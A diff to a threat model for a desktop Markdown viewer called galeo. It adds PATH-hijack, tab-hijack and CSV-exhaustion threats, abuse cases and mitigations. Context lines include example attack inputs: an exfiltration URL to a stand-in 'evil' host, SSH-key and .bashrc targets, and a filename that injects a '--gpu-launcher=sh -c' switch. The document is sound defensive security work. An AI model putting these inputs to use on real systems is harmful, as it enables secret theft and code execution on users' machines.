@@ -107,7 +107,7 @@ Ranking is likelihood × impact: **H**igh, **M**edium, **L**ow.
 | T5 | B8 | T, E | **Supply-chain compromise.** A malicious dependency version, a compromised GitHub Action, or a tampered release artifact. | M |
 | T6 | B3 | E, I, T | **IPC abuse from a compromised renderer.** It asks main to read arbitrary files (`~/.ssh/id_ed25519`), to write arbitrary paths (`~/.bashrc`, in v0.2), calls privileged APIs with unvalidated arguments, or **uses `openExternal` to send data out through the system browser** (`https://evil/?d=<secret>`), bypassing the zero-network rule. | M |
 | T7 | B1 | E | **Argument injection.** A file named like a Chromium or Node switch (`--remote-debugging-port=…`, `--inspect`, `--gpu-launcher=…`), or `ELECTRON_RUN_AS_NODE` / `NODE_OPTIONS` in the environment, turns the binary into a debugger or a general Node runtime. | M |
-| T8 | B5, B4 | D | **Resource exhaustion.** Pathological Markdown (deep nesting, quadratic emphasis), giant tables, Mermaid or KaTeX bombs, 1 GB files, binary files, very fast writes (watcher floods), quick-open over huge trees or symlink loops. The app freezes or crashes. | M |
+| T8 | B5, B4 | D | **Resource exhaustion.** Pathological Markdown (deep nesting, quadratic emphasis), giant tables, Mermaid or KaTeX bombs, 1 GB files, binary files, very fast writes (watcher floods), quick-open over huge trees or symlink loops. Work done on the page's own thread after a bounded parse, such as a CSV row of 200,000 fields drawn as that many cells per row in view (v0.3). The app freezes or crashes, and session restore brings the hang back. | M |
 | T9 | B4 | T | **Data loss on save (v0.2).** Overwriting an agent's concurrent write, partial writes on crash, breaking symlinks or permissions, saving into the wrong file after a rename. | M |
 | T10 | B4 | I | **Local metadata disclosure.** Session and recent-file lists reveal client names and paths to other local users, or through backups. Crash dumps include document content. | L |
 | T11 | B2 | S, T | **Single-instance spoofing.** Another same-user process sends crafted argv/cwd to open files or trigger commands. | L |
@@ -116,6 +116,8 @@ Ranking is likelihood × impact: **H**igh, **M**edium, **L**ow.
 | T14 | B4 | T | **Tampered settings or custom CSS.** Malformed JSON crashes main. CSS hides or overlays content. | L |
 | T15 | B3 | I | **Developer tools left on.** Production builds keep DevTools or remote debugging, which gives an easy full-renderer foothold. | L |
 | T17 | B5, B8 | E | **Running renderers unsandboxed.** Chromium's sandbox is unavailable (the AppImage on Ubuntu 24.04+, where AppArmor restricts user namespaces) or disabled (`--no-sandbox` passed by a user, a wrapper or a crafted `.desktop`), so a content exploit (T1/T4) runs with full user privileges. | **H** |
+| T18 | B4, B1 | E | **Programs main starts (v0.3).** `fc-list` (the font pickers) and `update-mime-database` (the AppImage launcher) are found on `PATH` by name. A relative `PATH` entry (`.`, or an empty one) resolves against the folder galeo was started in, so a cloned repo's executable `fc-list` runs as the user. | L |
+| T19 | B3 | E, T, I | **Tabs moving between windows (v0.3, ADR-019).** A compromised page claims a tab the reader drags in another window, with its edit grant and unsaved text, by naming an id it learned earlier. It can also learn which files and profiles the other windows show. | L |
 | T16 | — | R | **Repudiation.** Not meaningful for a single-user local tool; there are no actions by other principals to attribute. | — (accepted) |
 
 ## 4. Abuse cases
@@ -132,6 +134,9 @@ Ranking is likelihood × impact: **H**igh, **M**edium, **L**ow.
 | A7 | As a hostile author, I name a file `--gpu-launcher=sh -c evil.md` and wait for the user to run `galeo *` in that folder. | T7 |
 | A8 | As a hostile author, I commit a 300 MB `notes.md` with 10,000 nested lists and a Mermaid graph of 50,000 nodes, so that the user's session hangs on every restore. | T8 |
 | A9 | As the user's own agent, I rewrite `article.mdx` while the user has unsaved edits, and one of us silently loses work. | T9 |
+| A11 | As a hostile repo author, I commit a 400 KB `data.csv` whose first line has 200,000 fields, so that the window showing it, and every session that restores it, freezes. | T8 |
+| A12 | As a hostile repo author, I ship an executable `fc-list` and wait for a user whose `PATH` starts with `.` to run `galeo` in the repo and open the font picker. | T18 |
+| A13 | As an attacker with script in one window's renderer, I keep the id of a tab that left my window. When the reader later drags it in another window, I claim it, with its edit grant. | T19, T6 |
 
 ## 5. What we're doing about it: decisions and security requirements
 
@@ -153,6 +158,8 @@ criteria, feeding ADR-004/005/007/008 and the tests that prove them.
 | T11 | **Accept.** Same-user processes already have equal privilege; the channel only opens files, which is intended behaviour. Owner: project owner. | SR-13 (argv handled as data) |
 | T6 (residual) | **Accept.** A full renderer-process compromise can forge a drag-and-drop grant and read a local file into galeo, or, while the reader types, spend their key presses on quick-open listings, opens and the document's own links of its choosing. In v0.2 it can also write the one file the reader put in edit mode, while it is in edit mode, and the reader may confirm main's question about a file without reading its path. In v0.3 it can send its own tabs, with their grants and unsaved text, to another galeo window while the reader gives input (ADR-019); that window gains nothing the page didn't have. Exfiltration stays blocked (SR-04, SR-06, SR-12). Owner: project owner (writes: 2026-10-11, ADR-015). | SR-12 (drop grants from the preload's isolated world; input credits for quick open and links; edit mode only for read text, and main's own question for files the reader didn't hand over) |
 | T14 | Mitigate | SR-17 |
+| T18 | Mitigate (v0.3 audit L3: only absolute `PATH` entries) | SR-13 |
+| T19 | Mitigate (a drag is claimed once, on input; v0.3 audit L1: claimed by a per-drag token, not the tab id). The window list's file and profile names are accepted as metadata a page can't send anywhere (SR-04, SR-06). | SR-12, SR-16 |
 | T17 | Mitigate (sandbox on by default; `.deb` ships the AppArmor `userns` profile; unsandboxed only by explicit per-launch user opt-in, with a persistent warning, ADR-008; the "sandbox unavailable" window runs unsandboxed with no document content, ADR-009). Residual risk accepted by the user who opts in. Owner: project owner (2026-09-26) | SR-01, SR-08 |
 | T16 | **Accept.** Not applicable to a single-user local tool. Owner: project owner. | — |
 
@@ -213,8 +220,10 @@ no script execution (detected by a test hook) and no CSP bypass.
 no HTML labels). KaTeX runs with `trust: false` and `maxExpand`/`maxSize` limits. Shiki falls back
 to plain text for unknown languages. Diagram output SVG is sanitized before insertion: SVG
 elements only, and every URL, in attributes and in the diagram's own style sheet, must point to
-one of the diagram's own fragments. A document's `%%{init}%%` can't change the security settings
-or `themeCSS`, and Mermaid blanks theme values with characters that could start new CSS.
+one of the diagram's own fragments, however a CSS function is written (`image-set()`, escaped names). A
+document's `%%{init}%%` can't change the security settings, `themeCSS` or the fonts; Mermaid blanks theme
+values with characters that could start new CSS; and each diagram starts from Mermaid's reset, so one
+diagram's directives never reach the next.
 *AC*: payload tests for Mermaid and KaTeX injection vectors pass.
 
 **SR-04 — Only safe URLs reach the OS.** `shell.openExternal` accepts only `http:`, `https:` and
@@ -357,8 +366,9 @@ font tokens). *AC*: adapter tests with a fake runner; the no-network suite opens
   block shows an inline error.
 - The JSON and CSV readers (ADR-018) are linear, with no backtracking regular expressions: a JSON
   tree stops at 10 MB, 200,000 nodes or 1,000 levels of nesting; a table shows its first
-  1,000,000 rows and stops at 10,000,000 fields (its offsets' memory); past these the file is
-  source. The views draw only the rows in view.
+  1,000,000 rows and stops at 10,000,000 fields (its offsets' memory) or a row of more than
+  10,000 columns; past these the file is source. The views draw only the rows in view, and the
+  table only the columns in view, each cell at most 1,000 characters.
 - The own file watcher watches only open files (via their parent directories), coalesces events,
   and caps its rate.
 - `fc-list` (the font pickers' list) gets 5 s and 4 MB of output; past either it is stopped and the
@@ -418,8 +428,8 @@ that stays untouched and a session recovered from a snapshot.
 
 ## 6. Did we do a good job? Coverage check
 
-- Every trust boundary B1–B8 has at least one threat analysed: B1 (T7), B2 (T11), B3 (T6, T15),
-  B4 (T8–T10, T14), B5 (T1, T4, T8, T12, T13, T17), B6 (T3), B7 (T2), B8 (T5, T17).
+- Every trust boundary B1–B8 has at least one threat analysed: B1 (T7, T18), B2 (T11), B3 (T6, T15, T19),
+  B4 (T8–T10, T14, T18), B5 (T1, T4, T8, T12, T13, T17), B6 (T3), B7 (T2), B8 (T5, T17).
 - Every entry point in §2 maps to requirements: content (SR-01–03, SR-14); links (SR-04, SR-05);
   desktop hand-over (SR-13); same-user processes (T11 accepted, SR-16, SR-17); supply chain
   (SR-08–10).
@@ -439,4 +449,5 @@ Revisit this model when any of these arrive:
 - a change of shell (ADR-001 revisit triggers).
 
 Before each release, a security audit verifies SR-01…SR-17 against the code, and the release
-checklist records the result. Published audits: [v0.1](audits/2026-10-07-v0.1.md) and [v0.2](audits/2026-10-10-v0.2.md).
+checklist records the result. Published audits: [v0.1](audits/2026-10-07-v0.1.md), [v0.2](audits/2026-10-10-v0.2.md)
+and [v0.3](audits/2026-10-20-v0.3.md).
